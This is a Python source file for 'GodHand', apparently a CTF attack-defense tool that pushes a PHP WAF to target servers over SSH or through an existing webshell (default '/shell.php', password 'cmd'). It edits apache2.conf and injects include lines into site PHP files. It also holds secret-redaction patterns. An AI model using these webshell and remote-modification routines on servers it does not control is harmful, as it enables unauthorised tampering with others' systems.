"""Generated GodHand business implementation. Do not edit; see generate.py."""
from AI中枢.snapshot import ActorState, StateValue, StateTable, StateLog, DomainDialogs, DomainClock
from types import SimpleNamespace
tk = SimpleNamespace(END='end', INSERT='insert', NORMAL='normal', DISABLED='disabled', BOTH='both', LEFT='left', RIGHT='right', TOP='top', BOTTOM='bottom', X='x', Y='y')
END='end'
messagebox=DomainDialogs()
filedialog=DomainDialogs()
simpledialog=DomainDialogs()
CLOSURES={}
from AI中枢.core import app_root, resource_root
BASE=str(resource_root())
EXE_DIR=str(app_root())
import sys as _gh_sys
import os, sys, base64, json, ipaddress, time, re, threading, queue, ssl, subprocess
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
import requests
import socket
import hashlib
import shutil
import webbrowser
import ctypes
CONFIG_DIR = os.path.join(EXE_DIR, '管理工具')
from tool_launchers import SSHConnection, ToolLaunchError, launch_file_manager, launch_terminal
import copy
import csv
import io
import logging
from logging.handlers import RotatingFileHandler
import ntpath
from pathlib import Path
import shlex
import stat
import tarfile
import tempfile
import traceback
from contextlib import contextmanager, ExitStack
_SAVE_LOCK = threading.RLock()
_UI = None

def redact_secrets(text):
    text = str(text)
    text = re.sub('-----BEGIN [^-\\r\\n]*PRIVATE KEY-----.*?-----END [^-\\r\\n]*PRIVATE KEY-----', '[REDACTED PRIVATE KEY]', text, flags=re.S)
    text = re.sub('(?im)(["\']?\\b(?:Authorization|Cookie|Set-Cookie)\\b["\']?\\s*[:=]\\s*)(?:"[^"\\r\\n]*"|\'[^\'\\r\\n]*\'|[^\\r\\n]+)', '\\1[REDACTED]', text)
    text = re.sub('(https?://)[^\\s/@]+:[^\\s/@]+@', '\\1[REDACTED]@', text)
    keys = '(?:password|passwd|pwd|token|access_token|api[_-]?key|secret|client_secret|密码|口令)'
    return re.sub('(?i)(["\']?\\b' + keys + '\\b["\']?\\s*[:=]\\s*)(?:"[^"\\r\\n]*"|\'[^\'\\r\\n]*\'|[^\\s&,;\\r\\n}]+)', '\\1[REDACTED]', text)

def _record_error(title, exc_type, value, tb):
    try:
        text = redact_secrets(title + '\n' + ''.join(traceback.format_exception(exc_type, value, tb)))
        if len(text) > 128000:
            text = text[:64000] + '\n[truncated]\n' + text[-64000:]
        with _SAVE_LOCK:
            handler = RotatingFileHandler(os.path.join(EXE_DIR, 'god_error.log'), maxBytes=1024 ** 2, backupCount=3, encoding='utf-8')
            try:
                handler.setFormatter(logging.Formatter('[%(asctime)s] %(message)s'))
                handler.emit(logging.LogRecord('godhand.local', logging.ERROR, '', 0, text, (), None))
            finally:
                handler.close()
    except Exception:
        pass

def _warn_config(message):
    if _UI is not None and (not _UI.closed):
        _UI.post(messagebox.showwarning, '配置未覆盖', redact_secrets(message))

def atomic_write(path, data):
    path = Path(path)
    with _SAVE_LOCK:
        path.parent.mkdir(parents=True, exist_ok=True)
        if path.suffix.lower() == '.json' and path.exists():
            try:
                previous = json.loads(path.read_text(encoding='utf-8-sig'))
                incoming = json.loads(data)
                if type(previous) is not type(incoming):
                    raise ValueError('Configuration root type changed')
            except (ValueError, OSError) as exc:
                _warn_config(f'原配置读取失败，已保留文件：{path.name}')
                raise ValueError(f'Existing JSON is unreadable; retained: {path.name}') from exc
        fd, temporary = tempfile.mkstemp(prefix=path.name + '.', suffix='.tmp', dir=path.parent)
        try:
            with os.fdopen(fd, 'w', encoding='utf-8', newline='\n') as stream:
                stream.write(data)
                stream.flush()
                os.fsync(stream.fileno())
            os.replace(temporary, path)
        finally:
            if os.path.exists(temporary):
                os.unlink(temporary)

class UiDispatcher:
    """Workers enqueue callbacks; only the owner thread calls Tk.after."""

    def __init__(self, root):
        self.root = root
        self.owner = threading.get_ident()
        self.closed = False
        self.pending = queue.Queue(maxsize=4096)
        self._after = root.after
        self._cancel = root.after_cancel
        self._scheduled = set()
        self._counter = 0
        self._cancelled = set()
        self._lock = threading.Lock()
        root.after = self.after
        root.after_cancel = self.cancel
        root._ui_dispatcher = self
        self._poll = self._after(50, self._drain)

    def post(self, function, *args):
        return self.after(0, function, *args)

    def after(self, delay, function=None, *args):
        if self.closed:
            return None
        if function is None:
            if threading.get_ident() != self.owner:
                raise RuntimeError('Blocking Tk.after is only allowed on the UI thread')
            return self._after(delay)
        if threading.get_ident() == self.owner:
            return self._schedule(delay, function, args)
        with self._lock:
            self._counter += 1
            token = 'godhand-worker-' + str(self._counter)
        try:
            self.pending.put_nowait((token, delay, function, args))
        except queue.Full:
            return None
        return token

    def _schedule(self, delay, function, args, token=None):
        holder = []

        def invoke():
            if holder:
                self._scheduled.discard(holder[0])
            if not self.closed and token not in self._cancelled:
                function(*args)
            self._cancelled.discard(token)
        handle = self._after(delay, invoke)
        holder.append(handle)
        self._scheduled.add(handle)
        return handle

    def cancel(self, handle):
        if handle is None or self.closed:
            return
        if str(handle).startswith('godhand-worker-'):
            self._cancelled.add(handle)
        elif threading.get_ident() == self.owner:
            self._scheduled.discard(handle)
            self._cancel(handle)
        else:
            self.post(self.cancel, handle)

    def _drain(self):
        if self.closed:
            return
        for _ in range(200):
            try:
                token, delay, function, args = self.pending.get_nowait()
            except queue.Empty:
                break
            if token in self._cancelled:
                self._cancelled.discard(token)
            else:
                self._schedule(delay, function, args, token)
        self._poll = self._after(50, self._drain)

    def close(self):
        self.closed = True
        for handle in list(self._scheduled) + [self._poll]:
            try:
                self._cancel(handle)
            except tk.TclError:
                pass
        self._scheduled.clear()
        while not self.pending.empty():
            try:
                self.pending.get_nowait()
            except queue.Empty:
                break

def _is_link(path):
    try:
        info = os.lstat(path)
    except FileNotFoundError:
        return False
    return stat.S_ISLNK(info.st_mode) or bool(getattr(info, 'st_file_attributes', 0) & 1024)

@contextmanager
def _hold_directory(path):
    """On Windows, prevent directory rename/deletion during restore."""
    if os.name != 'nt':
        if _is_link(path):
            raise ValueError('Directory links are not allowed')
        yield
        return
    import ctypes
    from ctypes import wintypes
    kernel = ctypes.WinDLL('kernel32', use_last_error=True)
    kernel.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
    kernel.CreateFileW.restype = wintypes.HANDLE
    kernel.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel.GetFileInformationByHandleEx.argtypes = [wintypes.HANDLE, ctypes.c_int, wintypes.LPVOID, wintypes.DWORD]

    class Attributes(ctypes.Structure):
        _fields_ = [('attributes', wintypes.DWORD), ('tag', wintypes.DWORD)]
    handle = kernel.CreateFileW(str(path), 129, 3, None, 3, 35651584, None)
    if handle == wintypes.HANDLE(-1).value:
        raise ctypes.WinError(ctypes.get_last_error())
    try:
        info = Attributes()
        if not kernel.GetFileInformationByHandleEx(handle, 9, ctypes.byref(info), ctypes.sizeof(info)):
            raise ctypes.WinError(ctypes.get_last_error())
        if info.attributes & 1024 or not info.attributes & 16:
            raise ValueError('Restore destination contains a link or non-directory')
        yield
    finally:
        kernel.CloseHandle(handle)

def _checked_target(root, parts):
    target = root
    if _is_link(root):
        raise ValueError('Restore root is a link/reparse point')
    for part in parts:
        target = target / part
        if _is_link(target):
            raise ValueError('Restore path contains a link/reparse point')
    if os.path.commonpath([str(root), str(target.resolve())]) != str(root):
        raise ValueError('Archive path leaves the selected directory')
    return target

def restore_local_archive(archive, destination, *, max_members=50000, max_bytes=1024 ** 3):
    original = Path(destination).absolute()
    if _is_link(original) or not original.is_dir():
        raise ValueError('Select an existing ordinary directory')
    root = original.resolve()
    if root == Path(root.anchor):
        raise ValueError('A drive root cannot be a restore destination')
    planned, seen, wrapper, total = ([], {}, None, 0)
    with ExitStack() as locks, tarfile.open(archive, 'r:gz') as tar:
        held = set()

        def hold(path):
            if path not in held:
                locks.enter_context(_hold_directory(path))
                held.add(path)
        hold(root)
        for index, member in enumerate(tar, 1):
            if index > max_members:
                raise ValueError('Archive member limit exceeded')
            if not (member.isdir() or member.isreg()):
                raise ValueError('Archive links/special files are not allowed')
            name = member.name
            if '\\' in name or name.startswith('/') or ntpath.splitdrive(name)[0]:
                raise ValueError('Absolute or ambiguous archive path')
            parts = name.rstrip('/').split('/')
            if len(name) > 4096 or len(parts) > 64:
                raise ValueError('Archive path complexity limit exceeded')
            for part in parts:
                stem = part.split('.')[0].rstrip(' .').upper()
                if not part or part in ('.', '..') or part.endswith((' ', '.')) or re.search('[\\x00-\\x1f<>:"|?*]', part) or (stem in {'CON', 'PRN', 'AUX', 'NUL', 'CONIN$', 'CONOUT$', 'CLOCK$'}) or re.fullmatch('(?:COM|LPT)[1-9¹²³]', stem):
                    raise ValueError('Unsafe archive path component')
            if wrapper is None:
                wrapper = parts[0]
            if parts[0] != wrapper or (len(parts) == 1 and (not member.isdir())):
                raise ValueError('Expected one common website wrapper directory')
            relative = parts[1:]
            target = _checked_target(root, relative)
            key = os.path.normcase(str(target.resolve()))
            if key in seen:
                raise ValueError('Duplicate archive destination')
            seen[key] = member.isdir()
            if target.exists() and target.is_dir() != member.isdir():
                raise ValueError('Archive file/directory type conflict')
            for parent in reversed(target.parents):
                if parent == root or root in parent.parents:
                    if parent.exists():
                        if not parent.is_dir():
                            raise ValueError('Archive parent is a file')
                        hold(parent)
            if member.size < 0:
                raise ValueError('Invalid archive size')
            total += member.size
            if total > max_bytes:
                raise ValueError('Archive expanded size limit exceeded')
            planned.append((member, relative, target))
        if not planned:
            raise ValueError('Empty archive')
        for _, _, target in planned:
            for parent in target.parents:
                if parent == root.parent:
                    break
                if seen.get(os.path.normcase(str(parent.resolve()))) is False:
                    raise ValueError('Conflicting file and directory archive entries')

        def ensure_directory(path):
            if path == root:
                return
            ensure_directory(path.parent)
            _checked_target(root, path.relative_to(root).parts)
            path.mkdir(exist_ok=True)
            hold(path)
        count = 0
        for member, relative, target in planned:
            _checked_target(root, relative)
            if member.isdir():
                ensure_directory(target)
                continue
            ensure_directory(target.parent)
            fd, temporary = tempfile.mkstemp(prefix='.yl_restore_', dir=target.parent)
            try:
                with os.fdopen(fd, 'wb') as output, tar.extractfile(member) as source:
                    shutil.copyfileobj(source, output, length=1024 ** 2)
                    if output.tell() != member.size:
                        raise ValueError('Truncated archive contents')
                _checked_target(root, relative)
                os.replace(temporary, target)
                count += 1
            finally:
                if os.path.exists(temporary):
                    os.unlink(temporary)
        return count

def _restore_backup_choice(directory):
    return filedialog.askopenfilename(title='选择要还原的备份', initialdir=directory, filetypes=[('Website backup', '*.tar.gz')])

def _csv_cell(value):
    text = str(value)
    if text.lstrip().startswith(('=', '+', '-', '@')):
        text = "'" + text
    return text

def _split_monitor_line(line):
    match = re.match('^\\[([^]]+)\\]\\s*(.*)$', str(line))
    return match.groups() if match else ('', str(line))
import traceback as _tb

def _write_err(title, t, v, tb):
    _record_error(title, t, v, tb)

def _sys_exc_hook(t, v, tb):
    _write_err('sys.excepthook', t, v, tb)

def _thr_exc_hook(args):
    _write_err('threading.excepthook', args.exc_type, args.exc_value, args.exc_traceback)

def _try_add_path(base_path):
    if os.path.exists(os.path.join(base_path, '__init__.py')) or os.path.exists(base_path):
        sys.path.insert(0, base_path)
        return True
    return False

def _ensure_import(module_name, subdirs=None):
    if module_name in sys.modules:
        return sys.modules[module_name]
    meipass = getattr(sys, '_MEIPASS', '')
    candidates = [BASE] + ([meipass] if meipass else [])
    if subdirs:
        candidates = [os.path.join(p, subdirs) for p in candidates]
    for p in candidates:
        if os.path.isdir(p) or os.path.exists(os.path.join(os.path.dirname(p), module_name + '.py')):
            if p not in sys.path:
                sys.path.insert(0, p)
            break
    return __import__(module_name)

def _session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    return s

def make_base(ip, port, https):
    ip = str(ip).strip().strip('/')
    m = re.match('^(?:https?://)?(.+)$', ip, re.I)
    if m:
        ip = m.group(1)
    ip = ip.strip('/')
    proto = 'https' if https else 'http'
    if ':' in ip:
        return f'{proto}://{ip}'
    if https and port == 443:
        return f'{proto}://{ip}'
    if not https and port == 80:
        return f'{proto}://{ip}'
    return f'{proto}://{ip}:{port}'

def parse_targets(raw):
    ips = []
    if not raw:
        return ips
    for s in re.split('[,\\s\\n]+', raw):
        s = s.strip()
        if not s:
            continue
        try:
            for h in ipaddress.ip_network(s, strict=False).hosts():
                ips.append(str(h))
        except (ValueError, TypeError):
            ips.append(s)
    return ips

def safe_int(val, default=0):
    try:
        return int(val)
    except (ValueError, TypeError):
        return default

def pick_dir(entry):
    p = filedialog.askdirectory()
    if p:
        entry.delete(0, tk.END)
        entry.insert(0, p)
CONFIG_FILE = os.path.join(EXE_DIR, '管理工具', 'app_config.json')
WAF_SIG_KEY_FILE = os.path.join(CONFIG_DIR, 'waf_key.txt')

def _get_waf_key():
    """全局随机 WAF 签名密钥(每台部署机独立, 持久化到 管理工具/waf_key.txt)"""
    if os.path.exists(WAF_SIG_KEY_FILE):
        try:
            k = open(WAF_SIG_KEY_FILE, 'r', encoding='utf-8').read().strip()
            if k:
                return k
        except Exception:
            pass
    import secrets
    k = secrets.token_hex(16)
    try:
        os.makedirs(os.path.dirname(WAF_SIG_KEY_FILE), exist_ok=True)
        with open(WAF_SIG_KEY_FILE, 'w', encoding='utf-8') as f:
            f.write(k)
    except Exception:
        pass
    return k

def render_waf_strong(key=None):
    """读取 waf_strong.php 模板并注入签名密钥(替换占位符)"""
    key = key or _get_waf_key()
    for p in [os.path.join(BASE, '上传靶机', 'waf_strong.php'), os.path.join(BASE, 'waf_strong.php'), os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_strong.php'), os.path.join(os.path.dirname(sys.executable), 'waf_strong.php')]:
        if os.path.exists(p):
            with open(p, 'r', encoding='utf-8', errors='replace') as f:
                c = f.read()
            return c.replace('__YL_WAF_SIGKEY__', key)
    return None

def render_waf_ban(key=None):
    """读取 waf_ban.php 模板并注入签名密钥"""
    key = key or _get_waf_key()
    for p in [os.path.join(BASE, '上传靶机', 'waf_ban.php'), os.path.join(BASE, 'waf_ban.php'), os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_ban.php'), os.path.join(os.path.dirname(sys.executable), 'waf_ban.php')]:
        if os.path.exists(p):
            with open(p, 'r', encoding='utf-8', errors='replace') as f:
                c = f.read()
            return c.replace('__YL_WAF_SIGKEY__', key)
    return None

def _waf_htaccess():
    """生成加固 .htaccess: 禁止HTTP访问 WAF 配置/日志/黑名单脚本, mod_php下全局auto_prepend"""
    return '# YL WAF 加固\n<FilesMatch "^\\.waf\\.(dat|log)">\n  Require all denied\n  Deny from all\n</FilesMatch>\n<FilesMatch "^\\.waf\\.dat\\.php$">\n  Require all denied\n  Deny from all\n</FilesMatch>\n<FilesMatch "^waf_ban\\.php$">\n  Require all denied\n  Deny from all\n</FilesMatch>\nphp_value auto_prepend_file waf_strong.php\n'

class ConfigManager:
    """Object-shaped sections; unreadable originals are never overwritten."""
    _data = {}
    _loaded = False
    _blocked = False
    _lock = threading.RLock()

    @classmethod
    def _ensure(cls):
        with cls._lock:
            if cls._loaded:
                return
            cls._data, cls._blocked = ({}, False)
            if os.path.exists(CONFIG_FILE):
                try:
                    with open(CONFIG_FILE, encoding='utf-8-sig') as stream:
                        data = json.load(stream)
                    if not isinstance(data, dict):
                        raise ValueError('Configuration root must be an object')
                    cls._data = data
                except (ValueError, OSError) as exc:
                    cls._blocked = True
                    _warn_config(f'统一配置读取失败，原文件保留：{exc}')
            cls._loaded = True

    @classmethod
    def get_section(cls, section):
        cls._ensure()
        with cls._lock:
            value = cls._data.get(section, {})
            if not isinstance(value, dict):
                cls._blocked = True
                _warn_config(f'配置分区 {section} 应为对象，原文件保留')
                return {}
            return copy.deepcopy(value)

    @classmethod
    def get(cls, section, key, default=None):
        return cls.get_section(section).get(key, default)

    @classmethod
    def set(cls, section, key, value):
        data = cls.get_section(section)
        data[key] = value
        cls.set_section(section, data)

    @classmethod
    def set_section(cls, section, data):
        cls._ensure()
        if not isinstance(data, dict):
            raise ValueError('Configuration section must be an object')
        with cls._lock:
            cls._data[section] = copy.deepcopy(data)

    @classmethod
    def save(cls):
        cls._ensure()
        with cls._lock:
            if cls._blocked:
                raise ValueError('原配置格式有误，已暂停覆盖；请先修复或另行备份原文件')
            atomic_write(CONFIG_FILE, json.dumps(cls._data, indent=2, ensure_ascii=False, allow_nan=False))

def ssh_deploy_dialog(parent, title, desc, fields, on_deploy):
    """通用 SSH 一键部署弹窗"""
    win = tk.Toplevel(parent)
    win.title(title)
    win.geometry('450x300')
    win.transient(parent)
    win.grab_set()
    win.configure(bg='#070b14')
    tk.Label(win, text=title, fg='#00d4ff', bg='#070b14', font=('微软雅黑', 11, 'bold')).pack(pady=(12, 8))
    tk.Label(win, text=desc, fg='#6b7f9e', bg='#070b14', font=('微软雅黑', 9)).pack()
    form = tk.Frame(win, bg='#070b14')
    form.pack(padx=20, pady=10, fill=tk.X)
    vd = {}
    for label, key, default, show in fields:
        row = tk.Frame(form, bg='#070b14')
        row.pack(fill=tk.X, pady=2)
        tk.Label(row, text=label, fg='#d6e4ff', bg='#070b14', width=10, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
        var = tk.StringVar(value=default)
        vd[key] = var
        tk.Entry(row, textvariable=var, width=28, bg='#111c33', fg='#d6e4ff', insertbackground='#d6e4ff', relief=tk.FLAT, font=('Consolas', 9), show=show).pack(side=tk.LEFT, padx=4)

    def do_it():
        vals = {k: v.get().strip() for k, v in vd.items()}
        has_ssh = bool(vals.get('host')) or bool(vals.get('pwd'))
        has_ws = bool(vals.get('sh_url')) and bool(vals.get('sh_pass'))
        if has_ssh and (not (vals.get('host') and vals.get('pwd'))):
            messagebox.showerror('错误', 'SSH地址和密码需同时填写')
            return
        if not has_ssh and (not has_ws):
            messagebox.showerror('错误', '请填写 SSH地址+密码，或 Shell路径+密码 二选一')
            return
        win.destroy()
        on_deploy(vals)
    tk.Button(win, text='🚀 开始部署', command=do_it, bg='#00ff9d', fg='#04121a', relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'), activebackground='#00ff9d').pack(pady=10)

def pick_file(entry):
    p = filedialog.askopenfilename()
    if p:
        entry.delete(0, tk.END)
        entry.insert(0, p)

class LogWidget(ActorState):

    def log(self, msg, tag='info'):
        if _UI is not None:
            if _UI.closed:
                return
            if threading.get_ident() != _UI.owner:
                _UI.post(self.log, msg, tag)
                return
        self.text.config(state=tk.NORMAL)
        self.text.insert(tk.END, redact_secrets(msg)[:8192] + '\n', tag)
        lines = int(self.text.index('end-1c').split('.')[0])
        if lines > 2001:
            self.text.delete('1.0', f'{lines - 2000}.0')
        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)

    def clear(self):
        if _UI is not None:
            if _UI.closed:
                return
            if threading.get_ident() != _UI.owner:
                _UI.post(self.clear)
                return
        self.text.config(state=tk.NORMAL)
        self.text.delete('1.0', tk.END)
        self.text.config(state=tk.DISABLED)

    def add_search_bar(self, parent):
        f = tb.Frame(parent)
        tb.Label(f, text='搜索:').pack(side=tk.LEFT)
        e = tb.Entry(f, textvariable=self.search_var, width=20)
        e.pack(side=tk.LEFT, padx=2)
        tb.Button(f, text='🔍', command=self._do_search, width=3).pack(side=tk.LEFT)
        tb.Button(f, text='✕', command=self._clear_search, width=3).pack(side=tk.LEFT)
        return f

    def _do_search(self):
        kw = self.search_var.get().strip()
        if not kw:
            return
        self.text.config(state=tk.NORMAL)
        self.text.tag_remove('search', '1.0', tk.END)
        pos = '1.0'
        count = 0
        while True:
            pos = self.text.search(kw, pos, tk.END, nocase=True)
            if not pos:
                break
            end = f'{pos}+{len(kw)}c'
            self.text.tag_add('search', pos, end)
            self.text.tag_config('search', background='#e06c00', foreground='white')
            pos = end
            count += 1
        self.text.config(state=tk.DISABLED)
        if not count:
            self.log(f'未找到: {kw}', 'warn')

    def _clear_search(self):
        self.search_var.set('')
        self.text.tag_remove('search', '1.0', tk.END)
    _fields = {'text': {'kind': 'text', 'default': ''}, 'search_var': {'kind': 'value', 'default': ''}, '_search_visible': {'kind': 'literal', 'default': False}}
WAF_FILE = os.path.join(BASE, '上传靶机', 'waf_strong.php')
DAT_FILE = os.path.join(BASE, '上传靶机', '.waf.dat')

class WafTab(ActorState):

    def load_config(self):
        defaults = {'shell_url': '/shell.php', 'shell_pass': 'cmd', 'port': 80, 'https': False, 'threads': 20, 'timeout': 10, 'retry': 2, 'strength': '标准', 'whitelist': '', 'conn_mode': 'webshell', 'ssh_host': '', 'ssh_port': 22, 'ssh_user': 'root', 'ssh_pass': '', 'ssh_webdir': '/var/www/html'}
        self._waf_config_blocked = False
        d = {}
        d = ConfigManager.get_section('waf')
        ranges = {'port': (1, 65535), 'ssh_port': (1, 65535), 'threads': (1, 1000), 'timeout': (1, 600), 'retry': (0, 100)}
        for key, default in defaults.items():
            value = d.get(key, default)
            valid = True
            if key == 'https':
                aliases = {'true': True, 'yes': True, 'on': True, '1': True, 'false': False, 'no': False, 'off': False, '0': False}
                if isinstance(value, bool):
                    pass
                elif type(value) is int and value in (0, 1):
                    value = bool(value)
                elif isinstance(value, str) and value.lower() in aliases:
                    value = aliases[value.lower()]
                else:
                    valid = False
            elif key in ranges:
                try:
                    if isinstance(value, bool) or not isinstance(value, (int, str)):
                        raise ValueError()
                    value = int(value)
                    low, high = ranges[key]
                    valid = low <= value <= high
                except ValueError:
                    valid = False
            else:
                valid = isinstance(value, str)
            if not valid:
                self._waf_config_blocked = True
                _warn_config(f'WAF 配置字段 {key} 格式错误，本次显示默认值，原文件保留且暂停保存')
                value = default
            d[key] = value
        if self._waf_config_blocked:
            ConfigManager._blocked = True
        return d

    def save_config(self):
        if getattr(self, '_waf_config_blocked', False):
            _warn_config('WAF 配置格式有误，已暂停保存，原文件保留')
            return
        ConfigManager.set_section('waf', {'shell_url': self.e_shell_url.get(), 'shell_pass': self.e_shell_pass.get(), 'port': int(self.e_port.get()), 'https': self.v_https.get(), 'threads': int(self.e_threads.get()), 'timeout': int(self.e_timeout.get()), 'retry': int(self.e_retry.get()), 'conn_mode': self.conn_mode.get(), 'ssh_host': self.e_ssh_host.get(), 'ssh_port': self.e_ssh_port.get(), 'ssh_user': self.e_ssh_user.get(), 'ssh_pass': self.e_ssh_pass.get(), 'ssh_webdir': self.e_ssh_webdir.get(), 'strength': self.strength.get(), 'whitelist': self.e_whitelist.get()})
        ConfigManager.save()

    def toggle_pass(self):
        current = self.e_shell_pass.cget('show')
        self.e_shell_pass.config(show='' if current else '*')

    def _get_public_ip(self, timeout=2):
        import urllib.request
        for url in ('http://ip.sb', 'http://ident.me', 'http://ip.3322.net', 'https://api.ipify.org'):
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                return urllib.request.urlopen(req, timeout=timeout).read().decode('utf-8', 'replace').strip()
            except Exception:
                continue
        return ''

    def _switch_conn_mode(self):
        if self.conn_mode.get() == 'ssh':
            self.ws_frame.pack_forget()
            self.ssh_frame.pack(fill=tk.X, pady=2)
        else:
            self.ssh_frame.pack_forget()
            self.ws_frame.pack(fill=tk.X, pady=2)

    def _auto_mount_waf(self, ssh, web):
        """mod_php 下 .user.ini 不生效，自动把 WAF 挂载到业务入口（如 common.inc.php）
        检测: mods-enabled 的 php*.load / apache2ctl -M 有 php 模块 = mod_php 需挂载
              php-fpm 进程存在 = .user.ini 生效无需挂载
        """
        import time
        web = (web or '').rstrip('/')
        info = ''
        try:
            _, so, _ = ssh.exec_command("ls /etc/apache2/mods-enabled/ 2>/dev/null | grep -Ei '^php[0-9]*\\.load'; apache2ctl -M 2>/dev/null | grep -i 'php[0-9]*_module'; ps aux 2>/dev/null | grep -i 'php-fpm' | grep -v grep | head -1", timeout=10)
            so.channel.settimeout(10)
            info = (so.read().decode('utf-8', 'replace') or '').strip()
        except Exception:
            pass
        mod_php = 'php' in info.lower()
        has_fpm = 'php-fpm' in info.lower()
        if has_fpm and (not mod_php):
            return '[SKIP] 检测到 PHP-FPM，.user.ini 生效，无需入口挂载'
        if not mod_php and (not has_fpm):
            return '[WARN] 无法确认PHP运行模式，保守挂载入口(与.user.ini双保险)'
        apache_ok = False
        if mod_php:
            try:
                waf_path = web + '/waf_strong.php'
                dir_line = '<Directory "%s">\n  php_admin_value auto_prepend_file "%s"\n</Directory>\n' % (web, waf_path)
                _, so, _ = ssh.exec_command("grep -q 'php_admin_value auto_prepend_file' /etc/apache2/apache2.conf 2>/dev/null; echo $?", timeout=8)
                so.channel.settimeout(8)
                if (so.read().decode('utf-8', 'replace') or '').strip() != '0':
                    try:
                        with ssh.open_sftp() as sf:
                            with sf.open('/etc/apache2/apache2.conf', 'a') as f:
                                f.write('\n# YL WAF global auto_prepend\n' + dir_line)
                        ssh.exec_command('apachectl -t 2>/dev/null && (service apache2 reload 2>/dev/null || apachectl graceful 2>/dev/null); echo RELOAD_DONE')
                        apache_ok = True
                    except Exception:
                        apache_ok = False
            except Exception:
                apache_ok = False
            if apache_ok:
                return '[OK] mod_php全局注入成功 → Apache auto_prepend_file 已配置, 覆盖所有PHP脚本(含独立webshell)'
        entries = ['common.inc.php', 'conn.php', 'config.php', 'init.php', 'db.php', 'include/conn.php', 'include/config.php', 'include/init.php', 'includes/config.php', 'inc/config.php', 'sqlgunadmin/downlog.php', 'downlog.php', 'admin/downlog.php', 'download.php', 'down.php', 'admin/download.php']
        mounted = []
        already = []
        try:
            sftp = ssh.open_sftp()
            for name in entries:
                p = web + '/' + name
                try:
                    with sftp.open(p, 'r') as f:
                        content = f.read().decode('utf-8', 'replace')
                except Exception:
                    continue
                if 'waf_strong.php' in content:
                    already.append(p.replace(web, '', 1))
                    continue
                if '<?php' not in content:
                    continue
                rel_dir = p[len(web):].rsplit('/', 1)[0].strip('/')
                rel = '../' * (rel_dir.count('/') + 1) if rel_dir else ''
                stmt = "if(file_exists(__DIR__.'/%swaf_strong.php')){require_once __DIR__.'/%swaf_strong.php';}" % (rel, rel)
                bak = p + '.bak_' + time.strftime('%H%M%S')
                with sftp.open(bak, 'w') as f:
                    f.write(content)
                content = content.replace('<?php', '<?php\n' + stmt, 1)
                with sftp.open(p, 'w') as f:
                    f.write(content)
                mounted.append(p.replace(web, '', 1))
            sftp.close()
            if mounted:
                prefix = '[OK] Apache全局注入' if apache_ok else '[OK] 检测到mod_php，.user.ini不生效'
                return prefix + ' + 已挂载WAF到 ' + ', '.join(mounted)
            if already:
                return '[OK] WAF已挂载到入口 ' + ', '.join(already) + '（无需重复挂载）'
            if apache_ok:
                return '[OK] Apache全局auto_prepend注入成功(覆盖所有PHP脚本)'
            return '[WARN] 未找到可挂载入口(mod_php下.user.ini不生效，请手动挂载)'
        except Exception as e:
            try:
                sftp.close()
            except Exception:
                pass
            return '[FAIL] 入口挂载失败: %s' % e

    def ssh_deploy_waf(self):
        """SSH一键部署WAF文件"""
        win = tk.Toplevel(self.parent)
        win.title('SSH部署WAF文件')
        win.geometry('450x280')
        win.transient(self.parent)
        win.grab_set()
        win.configure(bg='#070b14')
        tk.Label(win, text='🚀 SSH一键部署WAF文件', fg='#00d4ff', bg='#070b14', font=('微软雅黑', 11, 'bold')).pack(pady=(12, 8))
        tk.Label(win, text='上传 waf_strong.php/.waf.dat.php/.htaccess 并加固权限', fg='#6b7f9e', bg='#070b14', font=('微软雅黑', 9)).pack()
        form = tk.Frame(win, bg='#070b14')
        form.pack(padx=20, pady=10, fill=tk.X)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        fields = [('SSH地址:', 'host', pre.get('host', '')), ('SSH端口:', 'port', pre.get('port', '22')), ('用户名:', 'user', pre.get('user', 'ctf')), ('密码:', 'pwd', pre.get('pwd', '')), ('Web目录:', 'web', pre.get('webdir', '/var/www/html'))]
        self._waf_deploy_vars = {}
        for label, key, default in fields:
            row = tk.Frame(form, bg='#070b14')
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=label, fg='#d6e4ff', bg='#070b14', width=8, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            self._waf_deploy_vars[key] = var
            show = ''
            tk.Entry(row, textvariable=var, width=30, bg='#111c33', fg='#d6e4ff', insertbackground='#d6e4ff', relief=tk.FLAT, font=('Consolas', 9), show='').pack(side=tk.LEFT, padx=4)

        def do_deploy():
            host = self._waf_deploy_vars['host'].get().strip()
            port = self._waf_deploy_vars['port'].get().strip()
            user = self._waf_deploy_vars['user'].get().strip()
            pwd = self._waf_deploy_vars['pwd'].get().strip()
            web = self._waf_deploy_vars['web'].get().strip()
            if not host or not pwd:
                messagebox.showerror('错误', '请填写SSH地址和密码')
                return
            waf_candidates = [os.path.join(BASE, '上传靶机', 'waf_strong.php'), os.path.join(BASE, 'waf_strong.php'), os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_strong.php'), os.path.join(os.path.dirname(sys.executable), 'waf_strong.php')]
            waf_php = None
            for p in waf_candidates:
                if os.path.exists(p):
                    waf_php = p
                    break
            dat_candidates = [os.path.join(BASE, '上传靶机', '.waf.dat'), os.path.join(BASE, '.waf.dat'), os.path.join(os.path.dirname(sys.executable), '上传靶机', '.waf.dat'), os.path.join(os.path.dirname(sys.executable), '.waf.dat')]
            waf_dat = None
            for p in dat_candidates:
                if os.path.exists(p):
                    waf_dat = p
                    break
            files = []
            waf_content = render_waf_strong()
            if waf_content:
                files.append(('waf_strong.php', waf_content))
            dat_content = self.build_waf_dat()
            if dat_content is None and waf_dat:
                with open(waf_dat, 'r', encoding='utf-8', errors='replace') as f:
                    dat_content = f.read()
            if dat_content:
                files.append(('.waf.dat.php', dat_content))
            ban_content = render_waf_ban()
            if ban_content:
                files.append(('waf_ban.php', ban_content))
